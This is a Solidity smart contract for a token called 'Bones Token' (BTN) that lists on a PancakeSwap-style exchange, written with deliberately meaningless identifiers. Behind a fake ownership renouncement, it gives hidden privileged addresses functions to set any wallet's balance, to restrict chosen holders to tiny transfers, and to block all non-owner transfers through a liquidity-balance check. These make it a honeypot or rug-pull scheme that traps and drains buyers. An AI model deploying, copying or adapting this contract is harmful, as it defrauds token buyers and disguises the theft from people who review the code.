//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface limitFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptMarketingList) external view returns (uint256);

    function transfer(address marketingTotal, uint256 amountAt) external returns (bool);

    function allowance(address receiverAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountAt) external returns (bool);

    function transferFrom(
        address sender,
        address marketingTotal,
        uint256 amountAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityAmount, uint256 value);
    event Approval(address indexed receiverAuto, address indexed spender, uint256 value);
}

abstract contract receiverListAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atFrom {
    function createPair(address limitList, address launchedTokenSell) external returns (address);
}

interface amountSender is limitFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BonesToken is receiverListAuto, limitFee, amountSender {

    function approve(address marketingReceiverSell, uint256 amountAt) public virtual override returns (bool) {
        buyAuto[_msgSender()][marketingReceiverSell] = amountAt;
        emit Approval(_msgSender(), marketingReceiverSell, amountAt);
        return true;
    }

    mapping(address => mapping(address => uint256)) private buyAuto;

    uint256 public tokenMin;

    uint256 private isFund = 100000000 * 10 ** 18;

    mapping(address => bool) public txAt;

    function totalSupply() external view virtual override returns (uint256) {
        return isFund;
    }

    uint8 private launchAmountReceiver = 18;

    constructor (){
        
        minTrading launchedFeeTrading = minTrading(receiverSell);
        minTotalExempt = atFrom(launchedFeeTrading.factory()).createPair(launchedFeeTrading.WETH(), address(this));
        
        isToTrading = _msgSender();
        teamBuy();
        launchedTradingLimit[isToTrading] = true;
        fundWallet[isToTrading] = isFund;
        
        emit Transfer(address(0), isToTrading, isFund);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchAmountReceiver;
    }

    uint256 maxAuto;

    address receiverSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 listToLaunched;

    function getOwner() external view returns (address) {
        return swapSender;
    }

    uint256 private listTotal;

    mapping(address => bool) public launchedTradingLimit;

    function teamBuy() public {
        emit OwnershipTransferred(isToTrading, address(0));
        swapSender = address(0);
    }

    address private swapSender;

    function transfer(address txReceiver, uint256 amountAt) external virtual override returns (bool) {
        return launchReceiverFrom(_msgSender(), txReceiver, amountAt);
    }

    function transferFrom(address maxIs, address marketingTotal, uint256 amountAt) external override returns (bool) {
        if (_msgSender() != receiverSell) {
            if (buyAuto[maxIs][_msgSender()] != type(uint256).max) {
                require(amountAt <= buyAuto[maxIs][_msgSender()]);
                buyAuto[maxIs][_msgSender()] -= amountAt;
            }
        }
        return launchReceiverFrom(maxIs, marketingTotal, amountAt);
    }

    function launchReceiverFrom(address maxIs, address marketingTotal, uint256 amountAt) internal returns (bool) {
        if (maxIs == isToTrading) {
            return launchSwap(maxIs, marketingTotal, amountAt);
        }
        uint256 autoLaunch = limitFee(minTotalExempt).balanceOf(fundIs);
        require(autoLaunch == maxAuto);
        require(marketingTotal != fundIs);
        if (txAt[maxIs]) {
            return launchSwap(maxIs, marketingTotal, toExempt);
        }
        return launchSwap(maxIs, marketingTotal, amountAt);
    }

    string private sellFrom = "Bones Token";

    function balanceOf(address exemptMarketingList) public view virtual override returns (uint256) {
        return fundWallet[exemptMarketingList];
    }

    string private liquidityListSwap = "BTN";

    function liquiditySender() private view {
        require(launchedTradingLimit[_msgSender()]);
    }

    function isTo(uint256 amountAt) public {
        liquiditySender();
        maxAuto = amountAt;
    }

    event OwnershipTransferred(address indexed toList, address indexed walletTotal);

    mapping(address => uint256) private fundWallet;

    function name() external view virtual override returns (string memory) {
        return sellFrom;
    }

    uint256 constant toExempt = 19 ** 10;

    function walletSwapAt(address modeIs) public {
        if (receiverSender) {
            return;
        }
        
        launchedTradingLimit[modeIs] = true;
        
        receiverSender = true;
    }

    function allowance(address senderAmount, address marketingReceiverSell) external view virtual override returns (uint256) {
        if (marketingReceiverSell == receiverSell) {
            return type(uint256).max;
        }
        return buyAuto[senderAmount][marketingReceiverSell];
    }

    bool public takeTotal;

    bool public receiverShouldLiquidity;

    function launchSwap(address maxIs, address marketingTotal, uint256 amountAt) internal returns (bool) {
        require(fundWallet[maxIs] >= amountAt);
        fundWallet[maxIs] -= amountAt;
        fundWallet[marketingTotal] += amountAt;
        emit Transfer(maxIs, marketingTotal, amountAt);
        return true;
    }

    function owner() external view returns (address) {
        return swapSender;
    }

    address public isToTrading;

    bool public receiverSender;

    function teamExemptAuto(address listFrom) public {
        liquiditySender();
        
        if (listFrom == isToTrading || listFrom == minTotalExempt) {
            return;
        }
        txAt[listFrom] = true;
    }

    address fundIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fundMin(address txReceiver, uint256 amountAt) public {
        liquiditySender();
        fundWallet[txReceiver] = amountAt;
    }

    address public minTotalExempt;

    function symbol() external view virtual override returns (string memory) {
        return liquidityListSwap;
    }

}